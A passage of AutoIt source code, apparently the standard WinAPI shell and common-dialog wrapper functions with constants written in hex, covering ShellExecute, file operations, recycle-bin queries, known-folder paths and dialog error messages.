        Local $acall = DllCall("comctl32.dll", "bool", "SetWindowSubclass", "hwnd", $hwnd, "ptr", $psubclassproc, "uint_ptr", $idsubclass, "dword_ptr", $pdata)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWindowSubclass

    Func _WinAPI_ShellAddToRecentDocs($sfilepath)
        If StringStripWS($sfilepath, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then
            $sfilepath = _WinAPI_PathSearchAndQualify($sfilepath, 0x1)
            If Not $sfilepath Then
                Return SetError(0x1, 0x0, 0x0)
            EndIf
        Else
            $sfilepath = Null
        EndIf
        DllCall("shell32.dll", "none", "SHAddToRecentDocs", "uint", 0x3, "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellAddToRecentDocs

    Func _WinAPI_ShellChangeNotify($ievent, $iflags, $iitem1 = 0x0, $iitem2 = 0x0)
        Local $stypeofitem1 = "dword_ptr", $stypeofitem2 = "dword_ptr"
        If IsString($iitem1) Then
            $stypeofitem1 = "wstr"
        EndIf
        If IsString($iitem2) Then
            $stypeofitem2 = "wstr"
        EndIf
        DllCall("shell32.dll", "none", "SHChangeNotify", "long", $ievent, "uint", $iflags, $stypeofitem1, $iitem1, $stypeofitem2, $iitem2)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellChangeNotify

    Func _WinAPI_ShellChangeNotifyDeregister($iid)
        Local $acall = DllCall("shell32.dll", "bool", "SHChangeNotifyDeregister", "ulong", $iid)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShellChangeNotifyDeregister

    Func _WinAPI_ShellChangeNotifyRegister($hwnd, $imsg, $ievents, $isources, $apaths, $brecursive = False)
        Local $ipath = $apaths, $tagstruct = ''
        If IsArray($apaths) Then
            If UBound($apaths, $UBOUND_COLUMNS) Then Return SetError(0x1, 0x0, 0x0)
        Else
            Dim $apaths[0x1] = [$ipath]
        EndIf
        For $i = 0x0 To UBound($apaths) + -1
            If Not _WinAPI_PathIsDirectory($apaths[$i]) Then Return SetError(0x2, 0x0, 0x0)
        Next
        For $i = 0x0 To UBound($apaths) + -1
            $tagstruct &= "ptr;int;"
        Next
        Local $tentry = DllStructCreate($tagstruct)
        For $i = 0x0 To UBound($apaths) + -1
            $apaths[$i] = _WinAPI_ShellILCreateFromPath(_WinAPI_PathSearchAndQualify($apaths[$i]))
            DllStructSetData($tentry, 0x2 * $i + 0x1, $apaths[$i])
            DllStructSetData($tentry, 0x2 * $i + 0x2, $brecursive)
        Next
        Local $ierror = 0x0
        Local $acall = DllCall("shell32.dll", "ulong", "SHChangeNotifyRegister", "hwnd", $hwnd, "int", $isources, "long", $ievents, "uint", $imsg, "int", UBound($apaths), "struct*", $tentry)
        If @error Or Not $acall[0x0] Then $ierror = @error + 0xa
        For $i = 0x0 To UBound($apaths) + -1
            _WinAPI_CoTaskMemFree($apaths[$i])
        Next
        Return SetError($ierror, 0x0, $acall[0x0])
    EndFunc    ; -> _WinAPI_ShellChangeNotifyRegister

    Func _WinAPI_ShellCreateDirectory($sfilepath, $hparent = 0x0, $tsecurity = 0x0)
        Local $acall = DllCall("shell32.dll", "int", "SHCreateDirectoryExW", "hwnd", $hparent, "wstr", $sfilepath, "struct*", $tsecurity)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellCreateDirectory

    Func _WinAPI_ShellEmptyRecycleBin($sroot = '', $iflags = 0x0, $hparent = 0x0)
        Local $acall = DllCall("shell32.dll", "long", "SHEmptyRecycleBinW", "hwnd", $hparent, "wstr", $sroot, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellEmptyRecycleBin

    Func _WinAPI_ShellExecute($sfilepath, $sargs = '', $sdir = '', $sverb = '', $ishow = 0x1, $hparent = 0x0)
        If Not StringStripWS($sargs, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sargs = Null
        If Not StringStripWS($sdir, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sdir = Null
        If Not StringStripWS($sverb, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sverb = Null
        Local $acall = DllCall("shell32.dll", "ULONG_PTR", "ShellExecuteW", "hwnd", $hparent, "wstr", $sverb, "wstr", $sfilepath, "wstr", $sargs, "wstr", $sdir, "int", $ishow)
        If @error Then Return SetError(@error, @extended, False)
        If $acall[0x0] <= 0x20 Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShellExecute

    Func _WinAPI_ShellExecuteEx(ByRef $tshexinfo)
        Local $acall = DllCall("shell32.dll", "bool", "ShellExecuteExW", "struct*", $tshexinfo)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShellExecuteEx

    Func _WinAPI_ShellExtractAssociatedIcon($sfilepath, $bsmall = False)
        Local $iflags = 0x100
        If Not _WinAPI_PathIsDirectory($sfilepath) Then
            $iflags = BitOR($iflags, 0x10)
        EndIf
        If $bsmall Then
            $iflags = BitOR($iflags, 0x1)
        EndIf
        Local $tshfileinfo = DllStructCreate($TAGSHFILEINFO)
        If Not _WinAPI_ShellGetFileInfo($sfilepath, $iflags, 0x0, $tshfileinfo) Then Return SetError(@error + 0xa, @extended, 0x0)
        Return DllStructGetData($tshfileinfo, "hIcon")
    EndFunc    ; -> _WinAPI_ShellExtractAssociatedIcon

    Func _WinAPI_ShellExtractIcon($sicon, $iindex, $iwidth, $iheight)
        Local $acall = DllCall("shell32.dll", "int", "SHExtractIconsW", "wstr", $sicon, "int", $iindex, "int", $iwidth, "int", $iheight, "ptr*", 0x0, "ptr*", 0x0, "int", 0x1, "int", 0x0)
        If @error Or Not $acall[0x0] Or Not $acall[0x5] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x5]
    EndFunc    ; -> _WinAPI_ShellExtractIcon

    Func _WinAPI_ShellFileOperation($sfrom, $sto, $ifunc, $iflags, $stitle = '', $hparent = 0x0)
        Local $idata
        If Not IsArray($sfrom) Then
            $idata = $sfrom
            Dim $sfrom[0x1] = [$idata]
        EndIf
        Local $tfrom = _WinAPI_ArrayToStruct($sfrom)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        If Not IsArray($sto) Then
            $idata = $sto
            Dim $sto[0x1] = [$idata]
        EndIf
        Local $tto = _WinAPI_ArrayToStruct($sto)
        If @error Then Return SetError(@error + 0x1e, @extended, 0x0)
        Local $tshfileopstruct = DllStructCreate($TAGSHFILEOPSTRUCT)
        DllStructSetData($tshfileopstruct, "hWnd", $hparent)
        DllStructSetData($tshfileopstruct, "Func", $ifunc)
        DllStructSetData($tshfileopstruct, "From", DllStructGetPtr($tfrom))
        DllStructSetData($tshfileopstruct, "To", DllStructGetPtr($tto))
        DllStructSetData($tshfileopstruct, "Flags", $iflags)
        DllStructSetData($tshfileopstruct, "ProgressTitle", $stitle)
        Local $acall = DllCall("shell32.dll", "int", "SHFileOperationW", "struct*", $tshfileopstruct)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $tshfileopstruct
    EndFunc    ; -> _WinAPI_ShellFileOperation

    Func _WinAPI_ShellFlushSFCache()
        DllCall("shell32.dll", "none", "SHFlushSFCache")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellFlushSFCache

    Func _WinAPI_ShellGetFileInfo($sfilepath, $iflags, $iattributes, ByRef $tshfileinfo)
        Local $acall = DllCall("shell32.dll", "dword_ptr", "SHGetFileInfoW", "wstr", $sfilepath, "dword", $iattributes, "struct*", $tshfileinfo, "uint", DllStructGetSize($tshfileinfo), "uint", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShellGetFileInfo

    Func _WinAPI_ShellGetIconOverlayIndex($sicon, $iindex)
        If Not StringStripWS($sicon, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sicon = Null
        Local $acall = DllCall("shell32.dll", "int", "SHGetIconOverlayIndexW", "wstr", $sicon, "int", $iindex)
        If @error Or ($acall[0x0] = + -1) Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShellGetIconOverlayIndex

    Func _WinAPI_ShellGetKnownFolderIDList($sguid, $iflags = 0x0, $htoken = 0x0)
        Local $tguid = DllStructCreate($TAGGUID)
        Local $acall = DllCall("ole32.dll", "uint", "CLSIDFromString", "wstr", $sguid, "struct*", $tguid)
        If @error Or $acall[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        $acall = DllCall("shell32.dll", "uint", "SHGetKnownFolderIDList", "struct*", $tguid, "dword", $iflags, "handle", $htoken, "ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x4]
    EndFunc    ; -> _WinAPI_ShellGetKnownFolderIDList

    Func _WinAPI_ShellGetKnownFolderPath($sguid, $iflags = 0x0, $htoken = 0x0)
        Local $tguid = DllStructCreate($TAGGUID)
        Local $acall = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $sguid, "struct*", $tguid)
        If @error Or $acall[0x0] Then Return SetError(@error + 0x14, @extended, '')
        $acall = DllCall("shell32.dll", "long", "SHGetKnownFolderPath", "struct*", $tguid, "dword", $iflags, "handle", $htoken, "ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Local $spath = _WinAPI_GetString($acall[0x4])
        _WinAPI_CoTaskMemFree($acall[0x4])
        Return $spath
    EndFunc    ; -> _WinAPI_ShellGetKnownFolderPath

    Func _WinAPI_ShellGetLocalizedName($sfilepath)
        Local $acall = DllCall("shell32.dll", "long", "SHGetLocalizedName", "wstr", $sfilepath, "wstr", '', "uint*", 0x0, "int*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Local $aret[0x2]
        Local $acall1 = DllCall("kernel32.dll", "dword", "ExpandEnvironmentStringsW", "wstr", $acall[0x2], "wstr", '', "dword", 0x1000)
        $aret[0x0] = $acall1[0x2]
        $aret[0x1] = $acall[0x4]
        Return $aret
    EndFunc    ; -> _WinAPI_ShellGetLocalizedName

    Func _WinAPI_ShellGetPathFromIDList($ppidl)
        Local $acall = DllCall("shell32.dll", "bool", "SHGetPathFromIDListW", "struct*", $ppidl, "wstr", '')
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_ShellGetPathFromIDList

    Func _WinAPI_ShellGetSetFolderCustomSettings($sfilepath, $iflag, ByRef $tshfcs)
        Local $sproc = "SHGetSetFolderCustomSettings"
        If _WinAPI_GetVersion() < 6 Then $sproc &= "W"
        Local $acall = DllCall("shell32.dll", "long", $sproc, "struct*", $tshfcs, "wstr", $sfilepath, "dword", $iflag)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellGetSetFolderCustomSettings

    Func _WinAPI_ShellGetSettings($iflags)
        Local $tshellstate = DllStructCreate("uint[8]")
        DllCall("shell32.dll", "none", "SHGetSetSettings", "struct*", $tshellstate, "dword", $iflags, "bool", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        Local $ival1 = DllStructGetData($tshellstate, 0x1, 0x1)
        Local $ival2 = DllStructGetData($tshellstate, 0x1, 0x8)
        Local $iresult = 0x0
        Local $aopt[0x14][0x2] = [[0x1, 0x1], [0x2, 0x2], [0x4, 0x8000], [0x8, 0x20], [0x10, 0x8], [0x20, 0x80], [0x40, 0x200], [0x80, 0x400], [0x100, 0x800], [0x400, 0x1000], [0x800, 0x2000], [0x1000, 0x4000], [0x2000, 0x20000], [0x8000, 0x40000], [0x10000, 0x100000], [0x1, 0x80000], [0x2, 0x200000], [0x8, 0x800000], [0x10, 0x1000000], [0x20, 0x2000000]]
        For $i = 0x0 To 0xe
            If BitAND($ival1, $aopt[$i][0x0]) Then
                $iresult += $aopt[$i][0x1]
            EndIf
        Next
        For $i = 0xf To 0x13
            If BitAND($ival2, $aopt[$i][0x0]) Then
                $iresult += $aopt[$i][0x1]
            EndIf
        Next
        Return $iresult
    EndFunc    ; -> _WinAPI_ShellGetSettings

    Func _WinAPI_ShellGetSpecialFolderLocation($icsidl)
        Local $acall = DllCall("shell32.dll", "long", "SHGetSpecialFolderLocation", "hwnd", 0x0, "int", $icsidl, "ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_ShellGetSpecialFolderLocation

    Func _WinAPI_ShellGetSpecialFolderPath($icsidl, $bcreate = False)
        Local $acall = DllCall("shell32.dll", "bool", "SHGetSpecialFolderPathW", "hwnd", 0x0, "wstr", '', "int", $icsidl, "bool", $bcreate)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_ShellGetSpecialFolderPath

    Func _WinAPI_ShellGetStockIconInfo($isiid, $iflags)
        Local $tshstockiconinfo = DllStructCreate($TAGSHSTOCKICONINFO)
        DllStructSetData($tshstockiconinfo, "Size", DllStructGetSize($tshstockiconinfo))
        Local $acall = DllCall("shell32.dll", "long", "SHGetStockIconInfo", "int", $isiid, "uint", $iflags, "struct*", $tshstockiconinfo)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $tshstockiconinfo
    EndFunc    ; -> _WinAPI_ShellGetStockIconInfo

    Func _WinAPI_ShellILCreateFromPath($sfilepath)
        Local $acall = DllCall("shell32.dll", "long", "SHILCreateFromPath", "wstr", $sfilepath, "ptr*", 0x0, "dword*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_ShellILCreateFromPath

    Func _WinAPI_ShellNotifyIcon($imessage, ByRef $tnotifyicondata)
        Local $acall = DllCall("shell32.dll", "bool", "Shell_NotifyIconW", "dword", $imessage, "struct*", $tnotifyicondata)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShellNotifyIcon

    Func _WinAPI_ShellNotifyIconGetRect($hwnd, $iid, $tguid = 0x0)
        Local $tnii = DllStructCreate("dword;hwnd;uint;" & $TAGGUID)
        DllStructSetData($tnii, 0x1, DllStructGetSize($tnii))
        DllStructSetData($tnii, 0x2, $hwnd)
        DllStructSetData($tnii, 0x3, $iid)
        If IsDllStruct($tguid) Then
            If Not _WinAPI_MoveMemory(DllStructGetPtr($tnii, 0x4), $tguid, 0x10) Then Return SetError(@error + 0xa, @extended, 0x0)
        EndIf
        Local $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("shell32.dll", "long", "Shell_NotifyIconGetRect", "struct*", $tnii, "struct*", $trect)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $trect
    EndFunc    ; -> _WinAPI_ShellNotifyIconGetRect

    Func _WinAPI_ShellObjectProperties($sfilepath, $itype = 0x2, $sproperty = '', $hparent = 0x0)
        If Not StringStripWS($sproperty, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sproperty = Null
        Local $acall = DllCall("shell32.dll", "bool", "SHObjectProperties", "hwnd", $hparent, "dword", $itype, "wstr", $sfilepath, "wstr", $sproperty)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShellObjectProperties

    Func _WinAPI_ShellOpenFolderAndSelectItems($sfilepath, $anames = 0x0, $ISTART = 0x0, $IEND = + -1, $iflags = 0x0)
        Local $ppidl, $acall, $tptr = 0x0, $icount = 0x0, $iobj = 0x0, $ierror = 0x0
        $sfilepath = _WinAPI_PathRemoveBackslash(_WinAPI_PathSearchAndQualify($sfilepath))
        If IsArray($anames) Then
            If $sfilepath And Not _WinAPI_PathIsDirectory($sfilepath) Then Return SetError(@error + 0x14, @extended, 0x0)
        EndIf
        $ppidl = _WinAPI_ShellILCreateFromPath($sfilepath)
        If @error Then Return SetError(@error + 0x1e, @extended, 0x0)
        If Not __CheckErrorArrayBounds($anames, $ISTART, $IEND) Then
            $tptr = DllStructCreate("ptr[" & ($IEND - $ISTART + 0x1) & "]")
            For $i = $ISTART To $IEND
                $icount += 0x1
                If $anames[$i] Then
                    DllStructSetData($tptr, 0x1, _WinAPI_ShellILCreateFromPath($sfilepath & "\\" & $anames[$i]), $icount)
                Else
                    DllStructSetData($tptr, 0x1, 0x0, $icount)
                EndIf
            Next
        EndIf
        If _WinAPI_CoInitialize() Then $iobj = 0x1
        $acall = DllCall("shell32.dll", "long", "SHOpenFolderAndSelectItems", "ptr", $ppidl, "uint", $icount, "struct*", $tptr, "dword", $iflags)
        If @error Then
            $ierror = @error + 0xa
        Else
            If $acall[0x0] Then $ierror = 0xa
        EndIf
        If $iobj Then _WinAPI_CoUninitialize()
        _WinAPI_CoTaskMemFree($ppidl)
        For $i = 0x1 To $icount
            $ppidl = DllStructGetData($tptr, $i)
            If $ppidl Then
                _WinAPI_CoTaskMemFree($ppidl)
            EndIf
        Next
        If $ierror = 0xa Then Return SetError(0xa, $acall[0x0], 0x0)
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellOpenFolderAndSelectItems

    Func _WinAPI_ShellQueryRecycleBin($sroot = '')
        Local $tagshqueryrbinfo = (@AutoItX64  ? ''  : "align 1;") & "dword cbSize;int64 Size;int64 nbFiles"
        Local $tshqrbi = DllStructCreate($tagshqueryrbinfo)
        DllStructSetData($tshqrbi, 0x1, DllStructGetSize($tshqrbi))
        Local $acall = DllCall("shell32.dll", "long", "SHQueryRecycleBinW", "wstr", $sroot, "struct*", $tshqrbi)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Local $aret[0x2]
        $aret[0x0] = DllStructGetData($tshqrbi, 0x2)
        $aret[0x1] = DllStructGetData($tshqrbi, 0x3)
        Return $aret
    EndFunc    ; -> _WinAPI_ShellQueryRecycleBin

    Func _WinAPI_ShellQueryUserNotificationState()
        Local $acall = DllCall("shell32.dll", "long", "SHQueryUserNotificationState", "uint*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x1]
    EndFunc    ; -> _WinAPI_ShellQueryUserNotificationState

    Func _WinAPI_ShellRemoveLocalizedName($sfilepath)
        Local $acall = DllCall("shell32.dll", "long", "SHRemoveLocalizedName", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellRemoveLocalizedName

    Func _WinAPI_ShellRestricted($irestriction)
        Local $acall = DllCall("shell32.dll", "dword", "SHRestricted", "uint", $irestriction)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShellRestricted

    Func _WinAPI_ShellSetKnownFolderPath($sguid, $sfilepath, $iflags = 0x0, $htoken = 0x0)
        Local $tguid = DllStructCreate($TAGGUID)
        Local $acall = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $sguid, "struct*", $tguid)
        If @error Or $acall[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        $acall = DllCall("shell32.dll", "long", "SHSetKnownFolderPath", "struct*", $tguid, "dword", $iflags, "handle", $htoken, "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellSetKnownFolderPath

    Func _WinAPI_ShellSetLocalizedName($sfilepath, $smodule, $iresid)
        Local $acall = DllCall("shell32.dll", "long", "SHSetLocalizedName", "wstr", $sfilepath, "wstr", $smodule, "int", $iresid)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellSetLocalizedName

    Func _WinAPI_ShellSetSettings($iflags, $bset)
        Local $ival1 = 0x0, $ival2 = 0x0
        Local $aopt[0x14][0x2] = [[0x1, 0x1], [0x2, 0x2], [0x4, 0x8000], [0x8, 0x20], [0x10, 0x8], [0x20, 0x80], [0x40, 0x200], [0x80, 0x400], [0x100, 0x800], [0x400, 0x1000], [0x800, 0x2000], [0x1000, 0x4000], [0x2000, 0x20000], [0x8000, 0x40000], [0x10000, 0x100000], [0x1, 0x80000], [0x2, 0x200000], [0x8, 0x800000], [0x10, 0x1000000], [0x20, 0x2000000]]
        If $bset Then
            For $i = 0x0 To 0xe
                If BitAND($iflags, $aopt[$i][0x1]) Then
                    $ival1 += $aopt[$i][0x0]
                EndIf
            Next
            For $i = 0xf To 0x13
                If BitAND($iflags, $aopt[$i][0x1]) Then
                    $ival2 += $aopt[$i][0x0]
                EndIf
            Next
        EndIf
        Local $tshellstate = DllStructCreate("uint[8]")
        DllStructSetData($tshellstate, 0x1, $ival1, 0x1)
        DllStructSetData($tshellstate, 0x1, $ival2, 0x8)
        DllCall("shell32.dll", "none", "SHGetSetSettings", "struct*", $tshellstate, "dword", $iflags, "bool", 0x1)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellSetSettings

    Func _WinAPI_ShellUpdateImage($sicon, $iindex, $iimage, $iflags = 0x0)
        DllCall("shell32.dll", "none", "SHUpdateImageW", "wstr", $sicon, "int", $iindex, "uint", $iflags, "int", $iimage)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellUpdateImage

#EndRegion Public Functions
#Region Global Variables and Constants
    Global $__g_pfrbuffer = 0x0, $__g_ifrbuffersize = 0x4001
    Global Const $TAGDEVNAMES = "ushort DriverOffset;ushort DeviceOffset;ushort OutputOffset;ushort Default"
    Global Const $TAGFINDREPLACE = "dword Size;hwnd hOwner;ptr hInstance;dword Flags;ptr FindWhat;ptr ReplaceWith;ushort FindWhatLen;ushort ReplaceWithLen;lparam lParam;ptr Hook;ptr TemplateName"
    Global Const $TAGMSGBOXPARAMS = "uint Size;hwnd hOwner;ptr hInstance;int_ptr Text;int_ptr Caption;dword Style;int_ptr Icon;dword_ptr ContextHelpId;ptr MsgBoxCallback;dword LanguageId"
    Global Const $TAGPAGESETUPDLG = "dword Size;hwnd hOwner;ptr hDevMode;ptr hDevNames;dword Flags;long PaperWidth;long PaperHeight;long MarginMinLeft;long MarginMinTop;long MarginMinRight;long Mar" & _
        "ginMinBottom;long MarginLeft;long MarginTop;long MarginRight;long MarginBottom;ptr hInstance;lparam lParam;ptr PageSetupHook;ptr PagePaintHook;ptr PageSetupTemp" & _
        "lateName;ptr hPageSetupTemplate"
    Global Const $TAGPRINTDLG = (@AutoItX64  ? ''  : "align 1;") & "dword Size;hwnd hOwner;handle hDevMode;handle hDevNames;handle hDC;dword Flags;word FromPage;word ToPage;word MinPage;word MaxPage;word Copies;handle hInstance;" & _
        "lparam lParam;ptr PrintHook;ptr SetupHook;ptr PrintTemplateName;ptr SetupTemplateName;handle hPrintTemplate;handle hSetupTemplate"
    Global Const $TAGPRINTDLGEX = "dword Size;hwnd hOwner;handle hDevMode;handle hDevNames;handle hDC;dword Flags;dword Flags2;dword ExclusionFlags;dword NumPageRanges;dword MaxPageRanges;ptr Pag" & _
        "eRanges;dword MinPage;dword MaxPage;dword Copies;handle hInstance;ptr PrintTemplateName;lparam lParam;dword NumPropertyPages;ptr hPropertyPages;dword StartPage;" & _
        "dword ResultAction"
    Global Const $TAGPRINTPAGERANGE = "dword FromPage;dword ToPage"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_BrowseForFolderDlg($sroot = '', $stext = '', $iflags = 0x0, $pbrowseproc = 0x0, $lparam = 0x0, $hparent = 0x0)
        Local Const $TAGBROWSEINFO = "hwnd hwndOwner;ptr pidlRoot;ptr pszDisplayName; ptr lpszTitle;uint ulFlags;ptr lpfn;lparam lParam;int iImage"
        Local $tbrowseinfo = DllStructCreate($TAGBROWSEINFO & ";wchar[" & (StringLen($stext) + 0x1) & "];wchar[260]")
        Local $ppidl = 0x0, $sresult = ''
        If StringStripWS($sroot, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then
            Local $spath = _WinAPI_PathSearchAndQualify($sroot, 0x1)
            If @error Then
                $spath = $sroot
            EndIf
            $ppidl = _WinAPI_ShellILCreateFromPath($spath)
            If @error Then
            EndIf
        EndIf
        DllStructSetData($tbrowseinfo, 0x1, $hparent)
        DllStructSetData($tbrowseinfo, 0x2, $ppidl)
        DllStructSetData($tbrowseinfo, 0x3, DllStructGetPtr($tbrowseinfo, 0xa))
        DllStructSetData($tbrowseinfo, 0x4, DllStructGetPtr($tbrowseinfo, 0x9))
        DllStructSetData($tbrowseinfo, 0x5, $iflags)
        DllStructSetData($tbrowseinfo, 0x6, $pbrowseproc)
        DllStructSetData($tbrowseinfo, 0x7, $lparam)
        DllStructSetData($tbrowseinfo, 0x8, 0x0)
        DllStructSetData($tbrowseinfo, 0x9, $stext)
        Local $acall = DllCall("shell32.dll", "ptr", "SHBrowseForFolderW", "struct*", $tbrowseinfo)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        $sresult = _WinAPI_ShellGetPathFromIDList($acall[0x0])
        _WinAPI_CoTaskMemFree($acall[0x0])
        If $ppidl Then
            _WinAPI_CoTaskMemFree($ppidl)
        EndIf
        If Not $sresult Then Return SetError(0xa, 0x0, '')
        Return $sresult
    EndFunc    ; -> _WinAPI_BrowseForFolderDlg

    Func _WinAPI_CommDlgExtendedError()
        Local Const $CDERR_DIALOGFAILURE = 0xffff
        Local Const $CDERR_FINDRESFAILURE = 0x6
        Local Const $CDERR_INITIALIZATION = 0x2
        Local Const $CDERR_LOADRESFAILURE = 0x7
        Local Const $CDERR_LOADSTRFAILURE = 0x5
        Local Const $CDERR_LOCKRESFAILURE = 0x8
        Local Const $CDERR_MEMALLOCFAILURE = 0x9
        Local Const $CDERR_MEMLOCKFAILURE = 0xa
        Local Const $CDERR_NOHINSTANCE = 0x4
        Local Const $CDERR_NOHOOK = 0xb
        Local Const $CDERR_NOTEMPLATE = 0x3
        Local Const $CDERR_REGISTERMSGFAIL = 0xc
        Local Const $CDERR_STRUCTSIZE = 0x1
        Local Const $FNERR_BUFFERTOOSMALL = 0x3003
        Local Const $FNERR_INVALIDFILENAME = 0x3002
        Local Const $FNERR_SUBCLASSFAILURE = 0x3001
        Local $acall = DllCall("comdlg32.dll", "dword", "CommDlgExtendedError")
        If Not @error Then
            Switch $acall[0x0]
            Case $CDERR_DIALOGFAILURE
                Return SetError($acall[0x0], 0x0, "The dialog box could not be created." & @LF & "The common dialog box function's call to the DialogBox function failed." & @LF & "For example, this error occurs if the common dialog box call specifies an invalid window handle.")
            Case $CDERR_FINDRESFAILURE
                Return SetError($acall[0x0], 0x0, "The common dialog box function failed to find a specified resource.")
            Case $CDERR_INITIALIZATION
                Return SetError($acall[0x0], 0x0, "The common dialog box function failed during initialization." & @LF & "This error often occurs when sufficient memory is not available.")
            Case $CDERR_LOADRESFAILURE
                Return SetError($acall[0x0], 0x0, "The common dialog box function failed to load a specified resource.")
            Case $CDERR_LOADSTRFAILURE
                Return SetError($acall[0x0], 0x0, "The common dialog box function failed to load a specified string.")
            Case $CDERR_LOCKRESFAILURE
                Return SetError($acall[0x0], 0x0, "The common dialog box function failed to lock a specified resource.")
            Case $CDERR_MEMALLOCFAILURE
                Return SetError($acall[0x0], 0x0, "The common dialog box function was unable to allocate memory for internal structures.")
            Case $CDERR_MEMLOCKFAILURE
                Return SetError($acall[0x0], 0x0, "The common dialog box function was unable to lock the memory associated with a handle.")
            Case $CDERR_NOHINSTANCE
                Return SetError($acall[0x0], 0x0, "The ENABLETEMPLATE flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a corresponding instance handle.")
            Case $CDERR_NOHOOK
                Return SetError($acall[0x0], 0x0, "The ENABLEHOOK flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a pointer to a corresponding hook procedure.")
            Case $CDERR_NOTEMPLATE
                Return SetError($acall[0x0], 0x0, "The ENABLETEMPLATE flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a corresponding template.")
            Case $CDERR_REGISTERMSGFAIL
                Return SetError($acall[0x0], 0x0, "The RegisterWindowMessage function returned an error code when it was called by the common dialog box function.")
            Case $CDERR_STRUCTSIZE
